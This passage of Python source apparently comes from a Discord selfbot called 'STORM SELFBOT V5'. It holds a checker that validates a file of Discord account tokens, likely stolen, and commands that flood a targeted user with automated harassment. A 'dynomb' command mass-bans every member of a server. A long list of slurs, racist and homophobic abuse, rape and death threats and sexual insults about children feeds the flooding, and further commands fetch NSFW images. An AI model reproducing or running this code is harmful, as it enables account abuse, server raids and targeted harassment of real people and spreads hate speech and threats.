async def tc(ctx):
    valid_tokens = 0
    valid_usernames = set()  # Use a set to avoid duplicates

    # Read tokens from the tokens2.txt file
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    valid_tokens_list = []  # List to keep track of valid tokens

    for token in tokens:
        try:
            # Make a request to get the user info
            headers = {
                "Authorization": token
            }
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

            if response.status_code == 200:  # Valid token
                valid_tokens += 1
                user_info = response.json()
                username = f"{user_info['username']}#{user_info['discriminator']}"
                valid_usernames.add(username)  # Add username to set
                valid_tokens_list.append(token)  # Keep the valid token

            else:  # Invalid token
                # If invalid, do not keep the token
                print(f"Deleting invalid token: {token}")

        except Exception as e:
            print(f"An error occurred: {e}")

    # Write back the valid tokens to the file, removing invalid tokens
    with open("tokens2.txt", "w") as f:
        f.write("\n".join(valid_tokens_list))

    # Construct the result message for valid tokens
    result_message_content = (f"` Valid tokens: {valid_tokens}`\n"
                              f"` Usernames found: {len(valid_usernames)}`")

    # Send the results message
    result_message = await ctx.send(result_message_content)

    # Delete the command message after 0.1 seconds
    await asyncio.sleep(0.1)
    await ctx.message.delete()  # Deletes the command message, not the result message
    
    

@bot.command()
async def tokuser(ctx):
    # Read tokens from tokens2.txt
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    valid_usernames = []

    for token in tokens:
        try:
            # Make a request to get the user info
            headers = {
                "Authorization": token
            }
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

            if response.status_code == 200:  # Valid token
                user_info = response.json()
                username = f"{user_info['username']}#{user_info['discriminator']}"
                valid_usernames.append(username)  # Append username in the order of tokens

        except Exception as e:
            print(f"An error occurred while fetching user info: {e}")

    # Construct the result message in chronological order
    usernames_display = "\n".join(f"{i + 1}. {username}" for i, username in enumerate(valid_usernames)) if valid_usernames else "No valid usernames found."
    result_message_content = (f"`Usernames:\n{usernames_display}`")

    # Send the results message
    await ctx.send(result_message_content)


@bot.command()
async def ar1(ctx, user_mention: str, *, text: str):

    custom_reply_list = [phrase.strip() for phrase in text.split(',')]

    ar1_targets[user_mention] = custom_reply_list

    confirmation = await ctx.send(f"Auto-reply enabled for {user_mention} with custom words: {', '.join(custom_reply_list)}")

    await asyncio.sleep(1)

    await ctx.message.delete()

    await confirmation.delete()



@bot.command()

async def ar2(ctx, user_mention: str, *, text: str):

    custom_reply_list = [phrase.strip() for phrase in text.split(',')]

    spaced_list = []

    for phrase in custom_reply_list:

        words = phrase.split()

        spaced_list.append('\n'.join([word + '\n' * 100 for word in words]))

    ar2_targets[user_mention] = spaced_list

    confirmation = await ctx.send(f"Auto-reply enabled for {user_mention} with spaced words.")

    await asyncio.sleep(1)

    await ctx.message.delete()

    await confirmation.delete() 
    
    
@bot.command()

async def ar1e(ctx):

    ar1_targets.clear()

    confirmation = await ctx.send("Custom auto-reply has been disabled for all users.")

    await asyncio.sleep(1)

    await ctx.message.delete()

    await confirmation.delete()



@bot.command()

async def ar2e(ctx):

    ar2_targets.clear()

    confirmation = await ctx.send("Spaced auto-reply has been disabled for all users.")

    await asyncio.sleep(1)

    await ctx.message.delete()

    await confirmation.delete()  
    
autoreplies = [
"Elbow Sniffer", "I Heard U Like Kids", "com reject LOL", "Dont U Sniff Dogshit", 
    "wsp biden kisser faggot", "Yo Slut Focus In Chat", "Toilet Cleaner?", "# Shit Sniffer?", 
    "# Don't Fold", "Cum Slut", "Grass Licker", "id piss on ur grave loser broke fuck lol 🤡",
    "sup feces sniffer how u been", "Hey I Heard You Like Kids", "Femboy", "Dont U Sniff Toilet Paper", 
    "Dont U Sniff Piss", "Booger Eater", "Half-Eaten Cow Lover", "Ur Mom Abuses You LOL", 
    "Autistic Bakugan", "Stop Fucking Your Mom", "Retarded Termite", "wsp slobber face munchie", 
    "wsp pedo molestor", "# I heard you eat bedbugs LOL", "Window Licker", "Rodent Licker", 
    "Yo Chat Look At This Roach Eater", "# Nice Fold", "# Don't Fold To DoomJX$TICE", 
    "FIGHT BACK \n FIGHT BACK \n FIGHT BACK \n FIGHT BACK \n FIGHT BACK \n FIGHT BACK", 
    "DONT FOLD \n DONT FOLD \n DONT FOLD \n DONT FOLD \n DONT FOLD \n DONT FOLD", "Wsp Pedo", 
    "Get Out Of Chat Nasty Ass Hoe", "You smell like beaver piss and 5 gay lesbian honey badgers", 
    "You got a gfuel tattoo under your armpit", "Thats why FlightReacts posted a hate comment on your dad's facebook", 
    "You got suplex slammed by Carmen Cortzen from the Spy Kids", 
    "Yo mom went toe to toe wit the hash slingin slasher", 
    "Yo grandmother taught the whole Glee class how to wrestle", 
    "UNSKILLED FARM WORKER", "Nigga you bout dislocated as fuck yo spine shaped like a special needs kangaroo doing the worm dumbass nigga you was in the african rainforest getting gangbanged by 7 bellydancing flamingos", 
    "You look like Patrick with corn rolls weak ass nigga you dirty as shit you watch fury from a roku tv from the smash bros game and you built like a booty bouncing papa Johns worker named tony with lipstick Siberian tiger stripes ass nigga you built like the great cacusian overchakra", 
    "You look like young ma with a boosie fade ugly ass nigga you dirty as shit and you built like a gay French kissing cock roach named jimmy with lipstick on dumb ass nigga you wash cars with duct tape and gorilla glue while a babysitter eats yo ass while listening to the ultra instinct theme song earape nigga you dirty as shit you got a iPhone 6 thats the shape of a laptop futuristic ass nigga you was binge watching Brandon rashad anime videos with a knife on yo lap dumb ass nigga you got triple butchins and you dance like a midget when yo mom tells you yo sister didn’t eat all the cheese cake cheese cake loving ass nigga", 
    "Stop \n Hiding \n From \n Me", "I \n Will \n Rip \n U \n In \n Half \n Cut \n Generator", 
    "stfu fat bum", "bring \n me \n ur \n neck \n ill \n kill \n you \n faggot \n ass \n slut \n ur \n weak \n as \n fuck \n nigga \n shut \n up \n vermin \n ass \n eslut \n with \n aids \n stupid \n cunt \n fucking \n trashbag \n niggas \n do \n not \n fw \n you \n at \n all \n weak \n lesbian \n zoophile", 
    "i \n will \n fucking \n end \n ur \n entire \n damn \n life \n failed \n com \n kid", 
    "I \n FUCKIN \n OWN \n YOU \n I \n WILL \n RIP \n YOUR \n GUTS \n OUT \n AND \n RIP \n YOUR \n HEAD \n OFF", 
    "Shut \n the \n fuck \n up \n bitch \n ass \n nigga \n you \n fucking  \n suck \n trashbag \n vermin \n ass \n bitch \n nigga", 
    "# STOP FOLDING \n SHIT \n EATER \n WHAT HAPPENED RATE LIMIT? \n HAHHAH \n UR \n ASS \n BITCH", 
    "U use skidded tools stfu LOL", "YOUR \n ASS \n KID \n STFU \n JUSTICE \n VICTIM I \n RUN \n YOU \n DOGSHIT \n ASS \n BITCH \n YOU \n SUCK \n ASS \n NGL", 
    "Golf Ball Nose", "Grease Stain", "ur unwanted", "frail bitch \n Stop Shaking \n diabetic \n salt licker", 
    "shut the fuck up salt shaker", "# WHY \n ARE \n YOU \n IN MY CHAT \n GET THE FUCK OUT OF HERE U PEDO \n UR A CLOWN \n I MOG U BITCH STAYYYYY MAD LMAOAOAOOAOAOOO \n I RUN UR BLOODLINE \n U CUT UR WRISTS FOR A BABOON STOP TALKIN \n FRAIL WEAK FUCKIN BITCH \n DIE HOE UR UNWANTED \n GET OVER THE FACT IM BETTER THAN U RN PATHETIC ASS SLUTTY PROSTITUTE \n UR MOM AND U AND UR SISTER LIVE OFF BINGO $ FROM UR GRANDMOTHER \n KEEP TRYING TO FIGHT ME \n FRAIL WEAK FUCK \n STOP SHAKIN SO BAD \n DIABETIC SALT SNIFFER", 
    "snapping turtle neck ass nigga", "this nigga got a Passport attached to his feet", "you picked your nose and found a Flute", 
    "FAGGOT ASS PEDO", "Dusty Termite", "STOP \n \n \n \n \n \n GETTING \n \n \n \n \n \n PUNCHED ON \n \n \n \n \n \n \n BY ME AND DEATH AND SOULZ \n \n \n \n \n \n \n UR FUCKIN ASS BITCH MADE ASS NIGGA I WILL END UR DAMN LIFE"
    "/TAKING BITCHED U LOLOLOL HAIL RUNS U PEDO WAEK FUCK DORK FUCK SLUT",    "nb cares faggot", "YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck dogshit ass nigga",
"SHUT\nUP\nFAGGOT\nASS\nNIGGA\nYOU\nARE\nNOT\nON\nMY\nLEVEL\nILL\nFUCKING\nKILL\nYOU\nDIRTY\nASS\nPIG\nBASTARD\nBARREL\nNOSTRIL\nFAGGOT\nI\nOWN\nYOU\nKID\nSTFU\nLAME\nASS\nNIGGA\nU\nFUCKING\nSUCK\nI\nOWN\nBOW\nDOWN\nTO\nME\nPEASENT\nFAT\nASS\nNIGGA",
"ILL\nTAKE\nUR\nFUCKING\nSKULL\nAND\nSMASH\nIT\nU\nDIRTY\nPEDOPHILE\nGET\nUR\nHANDS\nOFF\nTHOSE\nLITTLE\nKIDS\nNASTY\nASS\nNIGGA\nILL\nFUCKNG\nKILL\nYOU\nWEIRD\nASS\nSHITTER\nDIRTFACE\nUR\nNOT\nON\nMY\nLEVEL\nCRAZY\nASS\nNIGGA\nSHUT\nTHE\nFUCK\nUP",
"NIGGAS\nTOSS\nU\nAROUND\nFOR\nFUN\nU\nFAT\nFUCK\nSTOP\nPICKING\nUR\nNOSE\nFAGGOT\nILL\nSHOOT\nUR\nFLESH\nTHEN\nFEED\nUR\nDEAD\nCORPSE\nTO\nMY\nDOGS\nU\nNASTY\nIMBECILE\nSTOP\nFUCKING\nTALKING\nIM\nABOVE\nU\nIN\nEVERY\nWAY\nLMAO\nSTFU\nFAT\nNECK\nASS\nNIGGA",
"dirty ass rodent molester",
"ILL\nBREAK\nYOUR\nFRAGILE\nLEGS\nSOFT\nFUCK\nAND\nTHEN\nSTOMP\nON\nUR\nDEAD\nCORPSE",
"weak prostitute",
"stfu dork ass nigga",
"garbage ass slut",
"ur weak",
"why am i so above u rn",
"soft ass nigga",
"frail slut",
"ur slow as fuck",
"you cant beat me",
"shut the fuck up LOL",
"you suck faggot ass nigga be quiet",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck faggot ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck weak ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck soft ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck hoe ass nigga", "y ur ass so weak nigga", "yo stfu nb fw u", "com reject", "yo retard stfu", "pedo", "frail fuck",
"weakling", "# stop bothering minors", "# Don't Fold", "cuck", "faggot", "hop off the alt loser" "ðŸ¤¡","sup feces sniffer how u been", "hey i heard u like kids", "femboy", 
"sup retard", "ur actually ass wdf", "heard u eat ur boogers", "zoophile", "doesn't ur mom abuse u", "autistic fuck", "stop fantasizing about ur mom weirdo", "hey slut shut the fuck up","you're hideous bitch shut up and clean my dogs feces","hey slut come lick my armpits","prostitute stfu slut","bitch shut up","you are ass nigga you wanna be me so bad","why do your armpits smell like that","stop eating horse semen you faggot","stop sending me your butthole in DMs gay boy","why are you drinking tap water out of that goats anus","say something back bitch","you have a green shit ring around your bootyhole","i heard you use snake skin dildos","ill cum in your mouth booty shake ass nigga","type in chat stop fingering your booty hole","i heard you worship cat feces","worthless ass slave","get your head out of that toilet you slut","is it true you eat your dads belly button lint? pedo","fuck up baby fucker","dont you jerk off to elephant penis","hey i heard you eat your own hemorroids","shes only 5 get your dick off of her nipples pedo","you drink porta potty water","hey bitch\nstfu\nyou dogshit ass nigga\nill rip your face apart\nugly ass fucking pedo\nwhy does your dick smell like that\ngay ass faggot loser\nfucking freak\nshut up","i\nwill\nrip\nyour\nhead\noff\nof\nyour\nshoulders\npussy\nass\nslime ball","nigga\nshut\nup\npedophile","stfu you dogshit ass nigga you suck\nyour belly button smells like frog anus you dirty ass nigga\nill rape your whole family with a strap on\npathetic ass fucking toad","YOU\nARE\nWEAK\nAS\nFUCK\nPUSSY\nILL\nRIP\nYOUR\nVEINS\nOUT\nOF\nYOUR\nARMS\nFAGGOT\nASS\nPUSSY\nNIGGA\nYOU\nFRAIL\nASS\nLITTLE\nFEMBOY","tranny anus licking buffalo","your elbows stink","frog","ugly ass ostrich","pencil necked racoon","why do your elbows smell like squid testicals","you have micro penis","you have aids","semen sucking blood worm","greasy elbow geek","why do your testicals smell like dead   buffalo appendages","cockroach","Mosquito","bald penguin","cow fucker","cross eyed billy goat","eggplant","sweat gobbler","cuck","penis warlord","slave","my nipples are more worthy than you","hairless dog","alligator","shave your nipples","termite","bald eagle","hippo","cross eyed chicken","spinosaurus rex","deformed cactus","prostitute","come clean my suit","rusty nail","stop eating water balloons","dumb blow dart","shit ball","slime ball","golf ball nose","take that stick of dynamite out of your nose","go clean my coffee mug","hey slave my pitbull just took a shit, go clean his asshole","walking windshield wiper","hornet","homeless pincone","hey hand sanitizer come lick the dirt off my hands","ice cream scooper","aborted fetus","dead child","stop watching child porn and fight back","homeless rodant","hammerhead shark","hey sledgehammer nose","your breath stinks","you cross eyed street lamp","hey pizza face","shave your mullet","shrink ray penis","hey shoe box come hold my balenciagas","rusty cork screw","pig penis","hey cow sniffer","walking whoopee cushion","stop chewing on your shoe laces","pet bullet ant","hey mop come clean my floor","*rapes your ass* now what nigga","hey tissue box i just nutted on your girlfriend come clean it up","watermelon seed","hey tree stump","hey get that fly swatter out of your penis hole","melted crayon","hey piss elbows","piss ball","hey q tip come clean my ears","why is that saxaphone in your anus","stink beetle","bed bug","cross eyed bottle of mustard","hey ash tray","hey stop licking that stop sign","why is that spatula in your anus","hey melted chocolate bar","dumb coconut"
]


autoreply_tasks = {}  

@bot.command()
async def arr(ctx, user: discord.User):
    channel_id = ctx.channel.id
    last_message_time = 0
    backoff_time = 0.1 

    async def send_autoreply(message):
        nonlocal last_message_time, backoff_time
        try:
            current_time = time.time()
            time_since_last = current_time - last_message_time
            
            if time_since_last < backoff_time:
                await asyncio.sleep(backoff_time - time_since_last)
            
            random_reply = random.choice(autoreplies)
            await ctx.send(f"{user.mention} {random_reply}")
            
            last_message_time = time.time()
            backoff_time = max(0.1, backoff_time * 0.95)
            
        except discord.HTTPException as e:
            if e.status == 429:  # Rate limit hit
                retry_after = float(e.response.headers.get('retry_after', 1.0))
                print(f"Rate limited in ar command. Waiting {retry_after}s...")
                backoff_time = min(2.0, backoff_time * 1.5)
                await asyncio.sleep(retry_after)
                await send_autoreply(message)
            else:
                print(f"HTTP Error in ar command: {e}")
                await asyncio.sleep(1)
        except Exception as e:
            print(f"Error in ar command: {e}")
            await asyncio.sleep(1)

    async def reply_loop():
        def check(m):
            return m.author == user and m.channel == ctx.channel

        while True:
            try:
                message = await bot.wait_for('message', check=check)
                # Add small random delay before responding
                await asyncio.sleep(random.uniform(0.1, 0.3))
                await send_autoreply(message)
            except Exception as e:
                print(f"Error in ar reply loop: {e}")
                await asyncio.sleep(1)

    task = bot.loop.create_task(reply_loop())
    autoreply_tasks[(user.id, channel_id)] = task
    await ctx.send(f"```Started auto replying to {user.name}```")

@bot.command()
async def arrend(ctx):
    channel_id = ctx.channel.id
    tasks_to_stop = [key for key in autoreply_tasks.keys() if key[1] == channel_id]
    
    if tasks_to_stop:
        for user_id in tasks_to_stop:
            task = autoreply_tasks.pop(user_id)
            task.cancel()
            await ctx.send(f"```Stopped the ar```")
           
@bot.command()
async def dynomb(ctx, *, reason: str = "No reason provided"):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send(f"?ban {member.mention} {reason}")
        await message.delete()
        await asyncio.sleep(4)    

@bot.command()
async def srvprune(ctx, days: int = 1):
    if not ctx.message.author.guild_permissions.administrator:
        await ctx.send('You need administrator to use this command.', delete_after=5)
        return

    guild = ctx.guild
    try:
        pruned = await guild.prune_members(days=days, compute_prune_count=True, reason='Pruning inactive members')
        await ctx.send(f'Pruned {pruned} members.', delete_after=3)
    except Exception as e:
        print(f'Failed to prune members: {e}')
           
@bot.command()
async def srvc(ctx, source_server_id: int, target_server_id: int):
    source_server = bot.get_guild(source_server_id)
    target_server = bot.get_guild(target_server_id)

    if not source_server or not target_server:
        await ctx.send('Invalid server IDs.')
        return

    # Clone roles from top to bottom
    sorted_roles = sorted(source_server.roles, key=lambda role: role.position, reverse=True)
    for role in sorted_roles:
        if role.is_default():
            continue
        await target_server.create_role(
            name=role.name,
            permissions=role.permissions,
            colour=role.colour,
            hoist=role.hoist,
            mentionable=role.mentionable
        )
        await asyncio.sleep(2)  # Add a 2-second delay after creating each role

    # Clone channels
    for category in source_server.categories:
        new_category = await target_server.create_category(name=category.name)
        await asyncio.sleep(2)  # Add a 2-second delay after creating each category
        for channel in category.channels:
            if isinstance(channel, discord.TextChannel):
                await target_server.create_text_channel(
                    name=channel.name,
                    category=new_category,
                    topic=channel.topic,
                    slowmode_delay=channel.slowmode_delay,
                    nsfw=channel.nsfw
                )
            elif isinstance(channel, discord.VoiceChannel):
                await target_server.create_voice_channel(
                    name=channel.name,
                    category=new_category,
                    bitrate=channel.bitrate,
                    user_limit=channel.user_limit
                )
            await asyncio.sleep(2)
    
    await ctx.send('Server clone complete!')
    
@bot.command()
async def lgcs(ctx):
    if not isinstance(ctx.channel, discord.DMChannel):
        await ctx.send('This command can only be used in direct messages.')
        return

    await ctx.send("Are you sure you want to leave all group DMs? Type 'yes' to confirm or 'no' to cancel.")
    
    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in ['yes', 'no']
    
    try:
        confirmation_msg = await bot.wait_for('message', timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send('Confirmation timed out. No changes were made.')
        return
    
    if confirmation_msg.content.lower() == 'no':
        await ctx.send('Operation cancelled.')
        return

    # Proceed with leaving the group DMs
    left_groups = 0
    for group in bot.private_channels:
        if isinstance(group, discord.GroupChannel):
            try:
                await group.leave()
                left_groups += 1
                await asyncio.sleep(2)
            except discord.Forbidden:
                await ctx.send(f'Failed to leave group: {group.name} due to missing access.')
            except Exception as e:
                await ctx.send(f'An error occurred while leaving group: {group.name}. Error: {e}')

    await ctx.send(f'Left {left_groups} group DMs.')       

@bot.command()
async def faggot(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% faggot\n nigga a fuckin faggot LMFAO 🏳️‍🌈")

@bot.command()
async def cringe(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% cringe\n fuckin cringe faggot 🏳️‍🌈")


@bot.command()
async def hindu(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% Hindu\n go drink cow piss")
    
@bot.command()
async def av(ctx, user: discord.User = None):
    try:
        if user is None:  # If no user is provided, get the bot's own avatar
            user = bot.user


        # Check if the user has an avatar
        if user.avatar:
            avatar_url = user.avatar_url
            await ctx.send(f"Avatar URL: {avatar_url}", delete_after=10101010101001010100101111)  # Delete response message after 10101010101001010100101111 seconds
        else:
            await ctx.send(f"{user.name} does not have an avatar.", delete_after=10101010101001010100101111)  # Delete response message after 10101010101001010100101111 seconds


        # Delete the command message itself after 2 seconds
        await asyncio.sleep(2)
        await ctx.message.delete()
    except Exception as e:
        await ctx.send(f"An error occurred: {e}", delete_after=10101010101001010100101111)  # Delete response message after 10101010101001010100101111 seconds

@bot.command()
async def whois(ctx, user: discord.User = None):
    user = user or ctx.author
    message = (
        f"```\n"
        f"User Info:\n"
        f"ID: {user.id}\n"
        f"Display Name: {user.display_name}\n"
        f"Created At: {user.created_at.strftime('%d/%m/%Y %H:%M:%S')}\n"
    )
    if ctx.guild:  # Only include 'Joined At' if in a server
        message += f"Joined At: {user.joined_at.strftime('%d/%m/%Y %H:%M:%S') if user.joined_at else 'N/A'}\n"
    message += "```"
    await ctx.send(message)

#Scrape Guild icon
@bot.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"**{ctx.guild.name}** has no icon")
        return
    await ctx.send(ctx.guild.icon_url)

#Scrape Guild banner
@bot.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"**{ctx.guild.name}** has no banner")
        return
    await ctx.send(ctx.guild.banner_url)
    
@bot.command(aliases=["userbanner"], description="Gets a user's banner.")
async def checkbanner(ctx, user: discord.User = None):
    await ctx.message.edit(content="Getting user banner...")

    if user is None:
        user = ctx.author

    try:
        banner = await bot.http.get_user_profile(user.id)
    except:
        await ctx.message.edit(content=":x: | Failed to get user banner.")

        await delete_after_timeout(ctx.message)
        return

    if banner["user"]["banner"] is None:
        await ctx.message.edit(content=":x: | User has no banner.")

        await delete_after_timeout(ctx.message)
        return

    message = f"""
{user}'s Banner:

https://cdn.discordapp.com/banners/{user.id}/{banner['user']['banner']}.png?size=600
"""

    await ctx.message.edit(content=f"{message}")

    await delete_after_timeout(ctx.message)


  
async def delete_after_timeout(message):
    await asyncio.sleep(["delete_timeout"])
    await message.delete()
    
url = {}  


@bot.command(name="ecchi")
async def ecchi(ctx, member: discord.Member = None):
    
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=ecchi&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some ecchi```\n[STORM SELFBOT V5]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="hentai")
async def hentai(ctx, member: discord.Member = None):
    
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=hentai&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some hentai```\n[STORM SELFBOT V5sb]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="uniform")
async def uniform(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=uniform&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some uniform content```\n[STORM SELFBOT V5]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="maid")
async def maid(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=maid&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some maid content```\n[STORM SELFBOT V5]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="oppai")
async def oppai(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=oppai&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some oppai content```\n[STORM SELFBOT V5]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="selfies")
async def selfies(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=selfies&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some selfies```\n[STORM SELFBOT V5]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="raiden")
async def raiden(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=raiden-shogun&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares Raiden content```\n[STORM SELFBOT V5]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="marin")
async def marin(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=marin-kitagawa&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares Marin content```\n[STORM SELFBOT V5]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")
                
@bot.command()
async def firstmessage(ctx, channel: discord.TextChannel = None):
    channel = channel or ctx.channel  
    try:

        first_message = await channel.history(limit=1, oldest_first=True).flatten()
        if first_message:
            msg = first_message[0]  
            response = f"here."

            await msg.reply(response)  
        else:
            await ctx.send("```No messages found in this channel.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")
        
        
ping_responses = {}

@bot.command()
async def pingresponse(ctx, action: str, *, response: str = None):
    global ping_responses
    action = action.lower()

    if action == "toggle":
        if ctx.channel.id in ping_responses:
            del ping_responses[ctx.channel.id]
            await ctx.send("```Ping response disabled for this channel.```")
        else:
            if response:
                ping_responses[ctx.channel.id] = response
                await ctx.send(f"```Ping response set to: {response}```")
            else:
                await ctx.send("```Please provide a response to set for pings.```")
    
    elif action == "list":
        if ctx.channel.id in ping_responses:
            await ctx.send(f"```Current ping response: {ping_responses[ctx.channel.id]}```")
        else:
            await ctx.send("```No custom ping response set for this channel.```")
    
    elif action == "clear":
        if ctx.channel.id in ping_responses:
            del ping_responses[ctx.channel.id]
            await ctx.send("```Ping response cleared for this channel.```")
        else:
            await ctx.send("```No custom ping response to clear for this channel.```")
    
    else:
        await ctx.send("```Invalid action. Use toggle, list, or clear.```")


insults_enabled = False  
autoinsults = [
    "your a skid",
    "stfu",
    "your such a loser",
    "fuck up boy",
    "no.",
    "why are you a bitch",
    "nigga you stink",
    "idk you",
    "LOLSSOL WHO ARE YOUa",
    "stop pinging me boy",
    "if your black stfu"
    
]

@bot.command(name="pinginsult")
async def pinginsult(ctx, action: str = None, *, insult: str = None):
    global insults_enabled

    if action is None:
        await ctx.send("```You need to specify an action: toggle, list, or clear.```")
        return

    if action.lower() == "toggle":
        insults_enabled = not insults_enabled  
        status = "enabled" if insults_enabled else "disabled"
        await ctx.send(f"```Ping insults are now {status}!```")

    elif action.lower() == "list":
        if autoinsults:
            insult_list = "\n".join(f"- {insult}" for insult in autoinsults)
            await ctx.send(f"```Current ping insults:\n{insult_list}```")
        else:
            await ctx.send("```No insults found in the list.```")

    elif action.lower() == "clear":
        autoinsults.clear()
        await ctx.send("```Ping insults cleared!```")

    else:
        await ctx.send("```Invalid action. Use toggle, list, or clear.```")

reactions_enabled = False  
custom_reaction = "😜"  
@bot.command(name="pingreact")
async def pingreact(ctx, action: str = None, reaction: str = None):
    global reactions_enabled, custom_reaction

    if action is None:
        await ctx.send("```You need to specify an action: toggle, list, clear, or set.```")
        return

    if action.lower() == "toggle":

        if reaction:
            custom_reaction = reaction  
            reactions_enabled = not reactions_enabled  
            status = "enabled" if reactions_enabled else "disabled"
            await ctx.send(f"```Ping reactions {status}! Custom reaction set to: {custom_reaction}```")
        else:
            reactions_enabled = not reactions_enabled  
            status = "enabled" if reactions_enabled else "disabled"
            await ctx.send(f"```Ping reactions {status}!```")

    elif action.lower() == "list":
        if reactions_enabled:
            await ctx.send(f"```Ping reactions are currently enabled. Current reaction: {custom_reaction}```")
        else:
            await ctx.send("```Ping reactions are currently disabled.```")

    elif action.lower() == "clear":
        reactions_enabled = False  
        await ctx.send("```Ping reactions cleared!```")

    else:
        await ctx.send("```Invalid action. Use toggle, list, or clear.```")

forced_nicknames = {}

